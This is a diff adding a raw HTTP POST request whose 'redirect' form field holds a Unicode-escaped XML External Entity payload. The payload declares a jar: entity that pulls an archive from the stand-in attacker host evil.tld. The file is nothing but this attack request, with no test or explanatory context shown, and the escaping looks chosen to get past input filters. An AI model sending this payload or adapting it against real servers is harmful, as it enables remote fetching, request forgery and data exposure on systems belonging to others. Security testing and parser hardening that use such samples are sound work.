@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Connection: close
+
+redirect=\u003C!DOCTYPE r [\u003C!ENTITY x SYSTEM \u0022jar:http://evil.tld/x.jar!/x\u0022\u003E]\u003E\u003Cr\u003E\u0026x\u003B\u003C/r\u003E
